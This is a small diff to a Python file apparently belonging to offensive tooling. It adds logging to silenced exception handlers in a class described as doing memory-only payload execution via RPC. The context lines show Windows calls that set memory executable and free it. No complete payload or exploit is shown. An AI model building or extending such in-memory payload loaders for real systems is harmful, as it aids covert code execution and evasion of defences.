@@ -6,6 +6,7 @@ import ctypes
 import ctypes.wintypes
 import time
 from typing import Optional, Dict
+from app.core.logger import logger
 
 class RPCMemoryLoader:
     """Memory-only payload execution via RPC"""
@@ -124,15 +125,17 @@ class RPCMemoryLoader:
             # Restore executable protection
             self.kernel32.VirtualProtect(memory_ptr, size, 0x40, ctypes.byref(old_protect))
             
-        except Exception:
+        except Exception as _exc:
             pass
+            logger.debug("Suppressed exception", exc_info=True)
     
     def cleanup_memory(self, memory_ptr: int):
         """Clean up allocated memory"""
         try:
             self.kernel32.VirtualFree(memory_ptr, 0, 0x8000)
-        except Exception:
+        except Exception as _exc:
             pass
+            logger.debug("Suppressed exception", exc_info=True)
 
 # Integration function
 def integrate_memory_loader(rpc_results: Dict) -> Dict:
